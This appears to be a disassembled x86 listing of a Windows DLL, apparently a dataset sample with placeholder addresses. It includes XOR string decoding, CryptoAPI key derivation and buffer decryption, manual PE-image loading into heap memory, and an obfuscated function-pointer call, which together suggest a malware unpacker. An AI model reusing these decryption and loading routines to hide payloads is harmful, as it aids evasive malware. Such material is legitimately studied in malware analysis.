lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_10054730
push ebp
mov ebp esp
sub esp 0x8
push ebx
push edi
mov ebx 0xfffffffc
lea ecx [ ecx ]
mov edi [ esi + 0x18 ]
cmp edi [ esi + 0x1c ]
je r-xdata
lea ebx [ ebx ]
mov ecx [ esi + 0x1c ]
mov eax [ esi + 0x18 ]
cmp eax ecx
je r-xdata
mov edx [ edi + 0x1c ]
push edx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add edi 0x24
cmp edi [ esi + 0x1c ]
jne r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
cmp eax 0x6
je r-xdata
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
push edx
push ecx
call sub_10039be0
mov ebx [ esi + 0x1c ]
add esp 0x8
mov [ ebp - 0x4 ] eax
mov edi eax
cmp eax ebx
je r-xdata
mov ecx [ esi + 0x8 ]
lea eax [ edi + 0x4 ]
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push edi
call sub_10078db0
add esp 0xc
add [ esi + 0x8 ] ebx
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0xc ]
push 0x1
call eax
add edi 0x4
cmp edi ecx
jne r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x14 ]
mov edi [ eax ]
mov ebx [ eax + 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x1c ] eax
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov edi [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
cmp edi ecx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x48 ]
cmp eax 0x4
je r-xdata
mov edx [ esi + 0x14 ]
push edx
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] ebx
test ebx ebx
jne r-xdata
push edi
call sub_1005eed0
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
add edi 0x24
cmp edi ebx
jne r-xdata
mov eax [ edi ]
push eax
call sub_1006591f
mov eax [ ebp - 0x4 ]
add esp 0x4
sub_10054860
push ebp
mov ebp esp
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor ebx ebx
mov edi edx
mov esi ecx
mov ecx [ r--data ]
mov [ ebp - 0xc0 ] edi
mov [ ebp - 0xb8 ] ebx
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffdf
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0x9
jb r-xdata
lea ecx [ ebp - 0xb8 ]
push ecx
lea edx [ ebp - 0x24 ]
xor eax eax
push edx
mov [ ebp - 0x12 ] ax
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax 0x6f
mov [ ebp - 0xbc ] ebx
call sub_100050e0
lea eax [ ebp - 0xbc ]
push eax
mov ecx edx
push ecx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax 0x126
call sub_100050e0
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push 0x8
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax 0x114
call sub_100050e0
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
xor eax eax
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
jmp r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0xe1
call sub_100050e0
mov edi eax
call sub_1005d250
mov edi [ ebp - 0xc0 ]
jmp r-xdata
mov ebx [ ebp - 0xb8 ]
mov [ edi ] eax
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0x107
call sub_100050e0
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
mov edi [ edi ]
call sub_100393b0
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ebx [ ebp - 0xbc ]
test ebx ebx
je r-xdata
sub_100549c8
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_1007a72d
add esp 0x14
pop ebp
retn
sub_10054a00
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x15 ] 0x0
mov esi ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ edi + 0x8 ] 0x0
pop edi
pop esi
pop ebx
retn
mov ecx [ esi + 0x8 ]
push ecx
mov ecx edi
call sub_10069f30
mov esi [ esi ]
push ebx
call sub_1006591f
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov ebx esi
je r-xdata
sub_10054a4d
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
push ebx
push 0x1
push r--data
push ebx
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] 0x3e8
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp [ ebp + 0x10 ] ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push ebx
push ebx
push 0x8003
push [ ebp - 0x4 ]
call [ CryptCreateHash@IAT ]
test eax eax
je r-xdata
push 0x4
push [ esi ]
mov [ ebp + 0x10 ] ebx
lea ebx [ ebp + 0x10 ]
call sub_1003d950
pop ecx
pop ecx
push [ ebp + 0x10 ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
push [ ebp + 0x10 ]
mov ebx eax
mov eax [ esi ]
add eax 0x4
push eax
call sub_1003d950
mov eax [ ebp + 0x10 ]
pop ecx
pop ecx
lea ecx [ ebp - 0x10 ]
push ecx
push 0x0
push 0x0
push eax
push ebx
push [ ebp - 0x4 ]
lea edi [ eax + 0x4 ]
call [ CryptImportKey@IAT ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea eax [ ebp - 0x4 ]
push eax
call sub_1000616f
jmp r-xdata
pop edi
pop esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0xc ]
call [ CryptHashData@IAT ]
test eax eax
je r-xdata
xor ebx ebx
test ebx ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
push [ ebp - 0xc ]
call [ CryptDestroyHash@IAT ]
mov [ ebp - 0xc ] ebx
lea eax [ ebp - 0x10 ]
push eax
push 0x800000
push [ ebp - 0xc ]
push 0x6801
push [ ebp - 0x4 ]
call [ CryptDeriveKey@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ebx [ esi ]
sub eax edi
push eax
lea eax [ ebx + edi ]
push eax
call sub_1003d950
mov eax [ ebp + 0xc ]
sub [ eax ] edi
pop ecx
pop ecx
xor ebx ebx
jmp r-xdata
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
push [ ebp - 0x10 ]
call [ CryptDestroyKey@IAT ]
push 0x3e8
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
pop ebx
leave
retn 0x10
push ebx
push [ ebp - 0x4 ]
call [ CryptReleaseContext@IAT ]
mov [ ebp + 0x13 ] bl
mov [ ebp + 0x14 ] ebx
mov [ ebp + 0x8 ] ebx
mov eax [ esi ]
add eax [ ebp + 0x8 ]
push [ ebp - 0x8 ]
mov ebx edi
push eax
call sub_1003d950
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
movzx eax [ ebp + 0x13 ]
push edi
push 0x0
push eax
push 0x0
push [ ebp - 0x10 ]
call [ CryptDecrypt@IAT ]
test eax eax
je r-xdata
mov [ ebp + 0x13 ] 0x1
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push [ ebp - 0x14 ]
mov ebx [ esi ]
add ebx [ ebp + 0x8 ]
push edi
call sub_1003d950
push [ ebp - 0x8 ]
mov ebx edi
call sub_10013670
add esp 0xc
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
inc [ ebp + 0x14 ]
add [ ebp + 0x8 ] 0x3e8
jmp r-xdata
mov ecx [ ebp + 0x14 ]
imul ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax ]
sub eax ecx
cmp eax [ ebp - 0x8 ]
ja r-xdata
sub_10054c75
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
mov edi [ ebp + 0xc ]
mov eax [ edi ]
xor ebx ebx
push ebx
push 0x1
push ebx
mov [ ebp + 0xc ] eax
push ebx
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push esi
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8 ]
call [ CryptImportKey@IAT ]
test eax eax
jne r-xdata
inc eax
mov esi [ ebp + 0x8 ]
push edi
push [ esi ]
push ebx
push 0x1
push ebx
push [ ebp - 0x4 ]
call [ CryptDecrypt@IAT ]
test eax eax
jne r-xdata
push 0x2
mov edi [ edi ]
mov eax [ ebp + 0xc ]
sub eax edi
push eax
mov eax [ esi ]
add eax edi
push ebx
push eax
call sub_10079a10
add esp 0xc
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
pop edi
pop ebx
leave
retn 0x10
push ebx
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
mov eax esi
pop esi
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
push [ edi ]
push [ esi ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push edi
push eax
push ebx
push 0x1
push ebx
push [ ebp - 0x4 ]
mov [ esi ] eax
call [ CryptDecrypt@IAT ]
test eax eax
jne r-xdata
pop esi
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
sub_10054d5f
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_10037958
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10010183
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1004fd82
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x18
sub_10054dd0
cmp [ esi + 0x6c ] 0x8
jb r-xdata
push ebx
push edi
xor edi edi
mov ebx 0x7
xor ecx ecx
mov [ esi + 0x6c ] ebx
mov [ esi + 0x68 ] edi
mov [ esi + 0x58 ] cx
cmp [ esi + 0x50 ] 0x8
jb r-xdata
mov eax [ esi + 0x58 ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ esi + 0x50 ] ebx
mov [ esi + 0x4c ] edi
mov [ esi + 0x3c ] ax
cmp [ esi + 0x30 ] 0x8
jb r-xdata
mov edx [ esi + 0x3c ]
push edx
call sub_1006591f
add esp 0x4
xor edx edx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x2c ] edi
mov [ esi + 0x1c ] dx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ esi + 0x1c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] ebx
xor ecx ecx
pop edi
mov [ esi ] cx
pop ebx
retn
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
sub_10054e60
push ebp
mov ebp esp
push 0xffffffff
push sub_10082a4b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov esi [ rw-data ]
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x38 ] eax
mov eax [ esi + 0x8 ]
sub eax [ esi + 0x4 ]
lea ebx [ esi + 0x4 ]
sar eax 0x2
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x34 ] edx
cmp eax 0x1e
jb r-xdata
push 0x110
call sub_10055606
add esp 0x4
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor edi edi
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push ecx
push edx
lea ecx [ esi + 0x64 ]
push ecx
lea edx [ esi + 0x48 ]
push edx
lea ecx [ esi + 0x2c ]
push ecx
mov ecx [ esi + 0xbc ]
lea edx [ esi + 0x80 ]
push edx
mov edx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp - 0x34 ]
push edx
mov edx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp - 0x3c ]
push edx
mov edx [ ebp - 0x38 ]
push edi
mov edi eax
call sub_1000b910
mov edi eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x18
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebx ]
lea edx [ ebp - 0x34 ]
cmp ecx edx
ja r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebx + 0x4 ]
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] edi
cmp ecx eax
jae r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax ebx
call sub_10020b00
mov edi edx
sub edi ecx
sar edi 0x2
cmp eax [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x4
mov esi [ esi + 0x8 ]
mov ebx [ ebx ]
mov eax esi
sub eax ebx
push sub_1005e150
sar eax 0x2
push eax
push esi
push ebx
call sub_10057f80
add esp 0x10
lea edx [ ebp - 0x30 ]
mov eax 0x47
call sub_10060ac0
mov eax 0x1
mov [ eax ] edi
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax ebx
call sub_10020b00
mov ecx [ ebx ]
mov edx [ ecx + edi * 4 ]
mov [ eax ] edx
jmp r-xdata
sub_10054fc0
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0x1c ] eax
call sub_100796a0
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x1c ] 0x0
sub_10055000
push esi
mov esi ecx
mov eax [ esi + 0x98 ]
test eax eax
je r-xdata
pop esi
retn
mov ecx [ esi + 0x9c ]
push 0x8000
push ecx
push eax
call [ VirtualFree@IAT ]
mov [ esi + 0x98 ] 0x0
mov [ esi + 0x9c ] 0x0
sub_10055040
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov eax [ ebx ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax esi
je r-xdata
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
test eax eax
je r-xdata
mov [ ebx ] 0x0
test esi esi
je r-xdata
push eax
call sub_10022b5a
add esp 0x4
cmp [ esi ] 0x0
mov eax esi
je r-xdata
sub eax esi
push edi
lea edi [ eax + 0x1 ]
push edi
call sub_1004ac7a
add esp 0x4
mov [ ebx ] eax
test eax eax
je r-xdata
mov edi edi
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
push edi
push esi
push eax
call sub_100796a0
add esp 0xc
inc eax
cmp [ eax ] 0x0
jne r-xdata
sub_100550c4
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_1002c5ed
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
push 0x0
push edi
mov ecx esi
call sub_1002a5ec
test al al
je r-xdata
pop edi
push [ ebp + 0xc ]
mov ecx esi
push ebx
push [ esi + 0x10 ]
call sub_1001e0aa
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_10055150
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0xc ]
mov eax 0x5a4d
cmp [ esi ] ax
je r-xdata
push ebx
mov ebx [ esi + 0x3c ]
add ebx esi
cmp [ ebx ] 0x4550
je r-xdata
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebx + 0x50 ]
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] eax
test eax eax
jne r-xdata
pop ebx
mov eax 0x2
pop esi
mov esp ebp
pop ebp
retn 0x8
push edi
mov edi eax
mov eax [ ebp + 0xc ]
mov ecx 0x10
[ edi ] [ esi ]
mov edi [ eax + 0x3c ]
add edi [ edx + 0x1c ]
mov ecx 0x3e
mov esi ebx
[ edi ] [ esi ]
mov eax [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x3c ]
add ecx eax
mov [ edx + 0x8 ] ecx
movzx esi [ ecx + 0x14 ]
movzx eax [ ebx + 0x14 ]
lea esi [ esi + ecx + 0x18 ]
mov [ ebp - 0x4 ] esi
xor esi esi
lea eax [ eax + ebx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
cmp si [ ecx + 0x6 ]
jae r-xdata
pop ebx
mov eax 0x3
pop esi
mov esp ebp
pop ebp
retn 0x8
pop edi
pop ebx
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x8
lea ebx [ edx + 0xc ]
jmp r-xdata
mov edi [ ebp - 0x4 ]
mov esi eax
mov ecx 0xa
[ edi ] [ esi ]
mov ecx [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
add eax [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
push eax
mov eax [ ecx + 0xc ]
add eax [ edx + 0x1c ]
push eax
call sub_100796a0
mov eax [ ebx + 0x4 ]
lea ecx [ ebp - 0x4 ]
add esp 0xc
cmp ecx eax
jae r-xdata
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebx ]
lea edx [ ebp - 0x4 ]
cmp ecx edx
ja r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax ebx
call sub_10020b00
mov esi edx
sub esi ecx
sar esi 0x2
cmp eax [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x8 ]
movzx edx [ ecx + 0x6 ]
mov eax 0x28
add [ ebp - 0x8 ] eax
add [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
cmp eax edx
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax ebx
call sub_10020b00
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebx ]
mov edx [ ecx + esi * 4 ]
mov [ eax ] edx
jmp r-xdata
sub_100552e0
push ebp
mov ebp esp
sub esp 0x14
mov edx [ rw-data ]
mov ecx [ ebp + 0xc ]
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov al 0x38
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] al
xor [ ebp + 0x9 ] al
xor [ ebp + 0xa ] al
xor [ ebp + 0xb ] al
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x4 ] ecx
call [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn 0x8
sub_10055328
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_10019dcd
pop ecx
pop ecx
pop ebp
retn
sub_10055350
push ebp
mov ebp esp
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
push eax
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov edx 0x7ffffffe
call sub_1006c8f0
test eax eax
js r-xdata
sub_10055390
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffbb
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x46
and edx 0xff
mov [ ebp + eax * 2 - 0x34 ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x24 ] ax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff8b
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0x7
jb r-xdata
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
lea ecx [ ebp - 0x20 ]
xor eax eax
push ecx
mov [ ebp - 0x12 ] ax
call esi
lea edx [ ebp - 0x34 ]
push edx
mov edi eax
call esi
add edi eax
lea eax [ ebp - 0x10 ]
push eax
call esi
add eax edi
lea ecx [ eax + eax + 0x6 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
call esi
add eax eax
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_100796a0
add esp 0xc
lea ecx [ ebp - 0x10 ]
push ecx
call esi
push r--data
mov edi eax
call esi
add eax eax
push eax
lea edx [ ebx + edi * 2 ]
push r--data
push edx
call sub_100796a0
add esp 0xc
push r--data
call esi
add edi eax
lea eax [ ebp - 0x34 ]
push eax
call esi
add eax eax
push eax
lea ecx [ ebp - 0x34 ]
push ecx
lea edx [ ebx + edi * 2 ]
push edx
call sub_100796a0
add esp 0xc
lea eax [ ebp - 0x34 ]
push eax
call esi
push r--data
add edi eax
call esi
add eax eax
push eax
lea ecx [ ebx + edi * 2 ]
push r--data
push ecx
call sub_100796a0
add esp 0xc
push r--data
call esi
lea edx [ ebp - 0x20 ]
push edx
add edi eax
call esi
add eax eax
push eax
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebx + edi * 2 ]
push ecx
call sub_100796a0
add esp 0xc
lea edx [ ebp - 0x20 ]
push edx
call esi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10055531
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10055569
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1001fc41
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_10055606
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1004ac7a
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_1003c644
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_1003c66c
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_1000bd19
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_1003f5b8
push sub_10084403
mov [ rw-data ] esi
call sub_100662c2
pop ecx
sub_10055691
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x6
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x8
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
